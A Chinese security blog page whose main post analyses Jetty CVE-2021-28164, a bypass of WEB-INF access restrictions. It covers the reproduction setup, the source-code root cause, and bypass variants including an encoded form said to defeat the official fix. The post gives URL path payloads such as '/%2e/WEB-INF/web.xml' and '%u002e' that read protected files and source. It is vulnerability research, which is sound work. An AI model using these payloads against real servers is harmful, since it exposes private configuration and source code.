<p>​        刚开始实现的时候以为这个实现很简单，没想到实际操作的时候遇到了很多问题，最终在瓜哥的指导下成功解决了版本兼容的问题。</p>
<p><strong>参考</strong></p>
<ul>
<li><a href="https://xz.aliyun.com/t/9715#toc-15" target="_blank" rel="noopener">https://xz.aliyun.com/t/9715#toc-15</a></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2021/06/11/jetty%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2021/06/11/jetty%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">jetty文件下载漏洞分析</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-06-11 11:14:17" itemprop="dateCreated datePublished" datetime="2021-06-11T11:14:17+08:00">2021-06-11</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-09-28 19:14:58" itemprop="dateModified" datetime="2021-09-28T19:14:58+08:00">2021-09-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/JAVA/" itemprop="url" rel="index">
                    <span itemprop="name">JAVA</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/JAVA/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" itemprop="url" rel="index">
                    <span itemprop="name">漏洞利用</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​        前段时间在分析Jetty漏洞时无意捡了个CVE，下面是当时分析该漏洞并挖掘到CVE的记录。</p>
<h2 id="CVE-2021-28164"><a href="#CVE-2021-28164" class="headerlink" title="CVE-2021-28164"></a>CVE-2021-28164</h2><p>​        该漏洞影响<code>9.4.37.v20210219</code> ，<code>9.4.38.v20210224</code>版本，攻击者可通过<code>/%2e/WEB-INF/</code>绕过WEB-INF下文件的访问限制，读取WEB-INF下的文件内容。目前该漏洞我仅在<code>9.4.38.v20210224</code>复现成功。</p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>​        首先使用IDEA创建一个maven的web项目，修改POM文件添加Jetty依赖,这个依赖使用阿里云的源是找不到的，可以修改为maven的官方源，并为maven设置socks代理来解决下载依赖的问题，下面是我的POM文件配置。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>war<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>jetty_CVE-2021-28169<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jetty_CVE-2021-28169<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.eclipse.jetty<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jetty-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.4.38.v20210224<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">httpConnector</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">port</span>&gt;</span>8082<span class="tag">&lt;/<span class="name">port</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">httpConnector</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">webApp</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">contextPath</span>&gt;</span>/<span class="tag">&lt;/<span class="name">contextPath</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">webApp</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>​        加载依赖后，通过<code>mvn jetty:run</code>命令运行jetty，访问<code>/%2e/WEB-INF/web.xml</code>读取xml文件，至此漏洞复现成功。</p>
<p><img src="/2021/06/11/jetty%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210611115919722.png" alt="image-20210611115919722"></p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>​        根据Jetty官网的描述，这个漏洞是由于servlet和url解析产生了不一致导致的。所以当使用<code>/%2e</code>进行绕过时，一定会进入到servlet，由于在Jetty中所有HTTPservlet的请求都会过<code>javax.servlet.http.HttpServlet#service(javax.servlet.http.HttpServletRequest, javax.servlet.http.HttpServletRespons)</code>,所以可以在该函数打断点观察程序后续的执行逻辑。</p>
<p><img src="/2021/06/11/jetty%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210611162904299.png" alt="image-20210611162904299">            接下来会进入到<code>org.eclipse.jetty.servlet.DefaultServlet#doGet</code>，在该方法中又会调用<code>org.eclipse.jetty.server.ResourceService#doGet</code>方法。</p>
<p><img src="/2021/06/11/jetty%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210611162957047.png" alt="image-20210611162957047"></p>
<p>​            在<code>org.eclipse.jetty.server.ResourceService#doGet</code>中会根据传入的路径获取文件内容。</p>
<p><img src="/2021/06/11/jetty%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210611173821872.png" alt="image-20210611173821872"></p>
<p>​            当获取的内容为目录时，则列出目录结构,所以也可以通过<code>/%2e/WEB-INF/</code>读取<code>WEB-INF</code>下的目录<img src="/2021/06/11/jetty%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210617103728909.png" alt="image-20210617103728909"></p>
<p>​            当正常读取到文件内容时，则将读取到的文件内容发送到客户端。</p>
<p><img src="/2021/06/11/jetty%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210617103814228.png" alt="image-20210617103814228"></p>
<p>​            通过上面的分析，<strong>之所以能进行文件读取操作，是因为DefaultServlet的处理导致的</strong>,通过查阅文档，DefaultServlet映射路径为<code>/</code>,主要作用为上下文提供对静态内容的处理。所以如果程序中将其他的servlet mapping设置为<code>/</code>,访问<code>/%2e/WEB-INF/web.xml</code>将不会触发读取漏洞，因为请求不会交给DefaultServlet处理。</p>
<p>​            <strong>那么为什么直接访问<code>/./WEB-INF/web.xml</code>不会触发漏洞呢？</strong></p>
<p>​            在<code>org.eclipse.jetty.server.Request#setMetaData</code>中会对请求的URI进行解析，在这个过程中会获取URL解码后的url并通过setPathInfo进行设置。<img src="/2021/06/11/jetty%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210617113525349.png" alt="image-20210617113525349"></p>
<p>​            在<code>org.eclipse.jetty.server.handler.ContextHandler#isProtectedTarget</code>中会判断请求的路径是否以<code>/WEB-INF</code>开头，由于url解码后的url并不满足条件，因此绕过了此处黑名单的检测，才能顺利的执行到DefaultServlet的方法，否则会直接返回。<img src="/2021/06/11/jetty%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210617113724406.png" alt="image-20210617113724406"></p>
<p><img src="/2021/06/11/jetty%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210617114153492.png" alt="image-20210617114153492"></p>
<p>​            <strong>为什么通过<code>/./WEB-INF/web.xml</code>可以顺利的请求到<code>/WEB-INF/web.xml</code>文件呢？</strong></p>
<p>​            这个取决于<code>org.eclipse.jetty.server.handler.ContextHandler#getResource</code>方法，在该方法中通过<code>canonicalPath</code>对路径进行处理，所有的<code>/./</code>都会被转换为<code>/</code>。</p>
<p><img src="/2021/06/11/jetty%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210617114648546.png" alt="image-20210617114648546"></p>
<p>​        <strong>除了%2e编码绕过，能否通过其他方式绕过？</strong></p>
<p>​        在获取<code>org.eclipse.jetty.http.HttpURI#getDecodedPath</code>获取解码参数时，主要是通过获取<code>_decodedPath</code>属性的值来实现的，而这个属性在<code>org.eclipse.jetty.http.HttpURI#parse(org.eclipse.jetty.http.HttpURI.State, java.lang.String, int, int)</code>方法中别赋值，首先通过<code>canonicalPath</code>对<code>/./</code>或<code>/../</code>形式的url进行转换，再通过<code>decodePath</code>进行解码。</p>
<p><img src="/2021/06/11/jetty%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210617140914230.png" alt="image-20210617140914230"></p>
<p>​        在<code>decodePath</code>中还会将<code>%u002e</code>,<code>%2e;;;</code>转换为<code>.</code>，因此也可以使用这种方式绕过。</p>
<p><img src="/2021/06/11/jetty%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210617141322126.png" alt="image-20210617141322126"></p>
<p>​            我们知道，这个漏洞之所以使用url编码，是为了绕过<code>canonicalPath</code>对<code>/./</code>的转换，但经过我们上面的分析也可以通过<code>/.;/WEB-INF/web.xml</code>来绕过，那么为什么不能使用这种方式绕过呢？</p>
<p>​            首先确实可以通过<code>/.;/</code>来绕过canonicalPath方法，但是实际使用这种方式会爆400,这是为什么呢？</p>
<p><img src="/2021/06/11/jetty%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210617143621772.png" alt="image-20210617143621772">)<img src="/2021/06/11/jetty%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210617143917629-1623911957932.png" alt="image-20210617143917629"></p>
<p>​        根据报错定位到<code>org.eclipse.jetty.server.Request#setMetaData</code>,<code>isAmbiguous</code>的返回结果是由<code>_ambiguous</code>决定的，所以要找到哪里给<code>_ambiguous</code>赋值。<img src="/2021/06/11/jetty%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210617144314517.png" alt="image-20210617144314517"></p>
<p>​        在<code>org.eclipse.jetty.http.HttpURI#checkSegment</code>中，当要处理的字符的前一个字符为.或者..时，会返回false，并给<code>_ambiguous</code>赋值。</p>
<p><img src="/2021/06/11/jetty%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210617145147766.png" alt="image-20210617145147766"></p>
<p><img src="/2021/06/11/jetty%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210617145222043.png" alt="image-20210617145222043"></p>
<p>​        注意代码<code>__ambiguousSegments.put(&quot;%2e&quot;, Boolean.TRUE);</code>，这里如果改为false，那么就无法使用<code>/%2e/WEB-INF/web.xml</code>来绕过。</p>
<p>​        <strong>除了读取xml文件，能否读取WEB-INF下的class或者jsp文件？</strong></p>
<p>​        当读取jsp文件时，并不会得到jsp文件的内容，因为HTTPServlet会将请求交给JettyJspServlet，会去解析jsp的内容，但使用这种方式也可以让我们直接去执行WEB-INF下的jsp文件。</p>
<p><img src="/2021/06/11/jetty%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210617152001682.png" alt="image-20210617152001682"></p>
<p>​        至于class或者jar文件，可以直接读取内容，所以利用该漏洞读取源码。</p>
<p><img src="/2021/06/11/jetty%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210617153253099.png" alt="image-20210617153253099"></p>
<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>​        最后看下官方是如何修复这个漏洞，有无绕过的可能。</p>
<p><img src="/2021/06/11/jetty%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210617154935767.png" alt="image-20210617154935767"></p>
<p>​        只有当ambiguous为true时才会执行上面的代码，但如果我们用<code>%u002e</code>就可以绕过该限制。</p>
<p><img src="/2021/06/11/jetty%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210617163502809.png" alt="image-20210617163502809"></p>
<h3 id="联系jetty获取CVE"><a href="#联系jetty获取CVE" class="headerlink" title="联系jetty获取CVE"></a>联系jetty获取CVE</h3><p><img src="/2021/06/11/jetty%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210621103311443.png" alt="image-20210621103311443"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​        通过对这个漏洞的分析，一方面觉得花费时间去跟进漏洞是值得的，另外身为一个做漏洞挖掘的，深入分析漏洞的原理是必要的，这也是能挖掘到新漏洞的前提。最后总结下这个漏洞的利用</p>
<ul>
<li>目录遍历，枚举/WEB-INF下的目录结构</li>
</ul>
<p><img src="/2021/06/11/jetty%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210621103858903.png" alt="image-20210621103858903"></p>
<ul>
<li>源码读取，除了可以读取配置文件，也可以读取class文件</li>
</ul>
<p><img src="/2021/06/11/jetty%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210621103934823.png" alt="image-20210621103934823"></p>
<ul>
<li>执行/WEB-INF下的JSP文件</li>
</ul>
<p><img src="/2021/06/11/jetty%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210621104048112.png" alt="image-20210621104048112"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

  </div>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let activeClass = CONFIG.comments.activeClass;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">藏青</p>
  <div class="site-description" itemprop="description">知行合一</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">49</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">15</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">20</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">藏青</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.2.0
  </div>
  <span class="post-meta-divider">|</span>
  <div class="theme-info">Theme – <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.7.1
  </div>

    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
